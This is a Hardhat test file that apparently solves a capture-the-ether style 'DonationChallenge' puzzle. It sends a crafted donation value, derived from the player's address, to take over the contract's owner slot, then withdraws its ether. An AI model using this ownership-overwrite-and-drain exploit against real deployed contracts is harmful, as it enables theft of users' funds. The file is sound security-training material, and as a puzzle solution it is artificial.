import { expect } from "chai";
import { ethers } from "hardhat";

describe("DonationChallenge", function () {
  it("should return true if we empty the campaign contributions", async function () {
    const [, player] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory("DonationChallenge");
    const challenge = await Challenge.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await challenge.deployed();

    await challenge.donate(player.address, {
      value: ethers.BigNumber.from(player.address).div(
        ethers.BigNumber.from(10).pow(36)
      ),
    });

    const withdrawTx = await challenge.connect(player).withdraw();
    await withdrawTx.wait();

    expect(await challenge.isComplete()).to.equal(true);
  });
});
